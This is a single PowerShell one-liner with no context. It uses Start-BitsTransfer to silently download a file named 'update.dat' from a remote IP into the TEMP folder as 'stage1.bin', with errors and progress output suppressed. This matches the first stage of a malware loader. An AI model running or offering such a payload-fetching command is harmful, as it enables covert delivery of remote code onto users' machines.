
Start-BitsTransfer -Source 'http://192.0.2.224/assets/update.dat' -Destination "$env:TEMP\stage1.bin" -ErrorAction SilentlyContinue; $ProgressPreference = "SilentlyContinue"
